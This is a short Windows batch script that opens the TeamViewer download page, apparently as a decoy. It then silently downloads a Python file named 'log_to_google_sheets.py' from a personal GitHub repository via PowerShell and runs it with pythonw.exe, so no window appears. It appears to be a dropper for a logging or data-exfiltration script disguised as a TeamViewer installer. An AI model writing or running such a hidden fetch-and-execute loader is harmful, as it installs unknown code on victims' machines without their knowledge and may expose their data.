@echo off
::
start "" "https://www.teamviewer.com/nl/download/windows/"

:: 
powershell -Command "(New-Object System.Net.WebClient).DownloadFile('https://github.com/lolohole/my-front-end/raw/main/log_to_google_sheets.py', 'log_to_google_sheets.py')"

:: 
pythonw.exe log_to_google_sheets.py

